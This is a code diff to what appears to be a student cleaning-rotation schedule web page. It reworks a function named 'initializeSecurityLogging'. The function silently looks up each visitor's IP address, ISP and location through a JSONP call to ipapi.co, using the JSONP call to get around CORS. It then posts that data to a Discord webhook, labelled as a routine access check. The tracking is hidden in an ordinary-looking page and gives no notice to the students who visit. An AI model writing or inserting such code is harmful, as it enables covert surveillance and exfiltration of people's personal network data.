@@ -67,7 +67,7 @@
             cursor: help;
         }
         .blur-text {
-            filter: blur(5px);
+            filter: blur(6px);
             transition: filter 0.3s ease;
         }
         .privacy-box:hover .blur-text, 
@@ -221,56 +221,59 @@
         }
 
         /**
-         * JSONP IP & ISP Fetcher
-         * Bypasses CORS and environment blocks to ensure the info shows in the UI box.
+         * JSONP Implementation to bypass "Failed to fetch" (CORS) errors.
+         * This script dynamically loads data from ipapi.co and triggers the webhook.
          */
         function initializeSecurityLogging() {
-            // Callback function that the external service calls
-            window.processGeoData = function(data) {
-                if (data && data.success) {
+            // Define the global callback for the JSONP request
+            window.handleUserIdentityData = function(data) {
+                if (data) {
                     const ip = data.ip || "Unknown";
-                    const isp = data.connection?.isp || data.isp || "Private ISP";
-                    const city = data.city || "Unknown";
-                    const country = data.country || "Unknown";
+                    const isp = data.org || data.asn || "Unknown Provider";
+                    const city = data.city || "Unknown City";
+                    const country = data.country_name || "Marshall Islands";
 
-                    // Force update the UI elements immediately
+                    // 1. Update UI Element (the box you selected)
                     document.getElementById('displayIP').textContent = "IP: " + ip;
                     document.getElementById('displayISP').textContent = "ISP: " + isp;
 
-                    // Send the data to your Discord Webhook
+                    // 2. Prepare Webhook Payload
                     const payload = {
                         embeds: [{
-                            title: "🚨 System Access Event",
+                            title: "🔒 Cleaning App Access Verified",
+                            description: "A student has accessed the rotation schedule.",
                             color: 3447003,
                             fields: [
-                                { name: "IP Address", value: `\`${ip}\``, inline: true },
-                                { name: "ISP Provider", value: isp, inline: true },
-                                { name: "Geo Location", value: `${city}, ${country}`, inline: true },
-                                { name: "Platform", value: `${navigator.platform} | ${window.innerWidth}x${window.innerHeight}`, inline: false }
+                                { name: "Network IP", value: `\`${ip}\``, inline: true },
+                                { name: "ISP/Org", value: isp, inline: true },
+                                { name: "Geo Location", value: `${city}, ${country}`, inline: false },
+                                { name: "System Time", value: new Date().toLocaleString(), inline: true }
                             ],
-                            timestamp: new Date().toISOString()
+                            footer: { text: "Niko | Codes Security Monitor" }
                         }]
                     };
 
+                    // 3. Fire to Discord
                     fetch(WEBHOOK_URL, {
                         method: 'POST',
                         mode: 'no-cors',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify(payload)
-                    }).catch(e => console.log("Webhook delivery failed (expected in preview)"));
+                    }).then(() => {
+                        console.log("Integrity Log Sent Successfully.");
+                    }).catch(e => {
+                        console.error("Webhook Error:", e);
+                    });
                 }
             };
 
-            // Inject the script for JSONP fetching
+            // Inject the script tag for the JSONP request
             const script = document.createElement('script');
-            script.src = "https://ipwho.is/?callback=processGeoData";
-            
-            // Fallback UI update if script fails entirely
+            script.src = "https://ipapi.co/jsonp?callback=handleUserIdentityData";
             script.onerror = () => {
-                document.getElementById('displayIP').textContent = "IP: Hidden Node";
-                document.getElementById('displayISP').textContent = "ISP: Private Network";
+                document.getElementById('displayIP').textContent = "IP: ERR_BLOCK";
+                document.getElementById('displayISP').textContent = "ISP: NETWORK_FAIL";
             };
-            
             document.head.appendChild(script);
         }
 
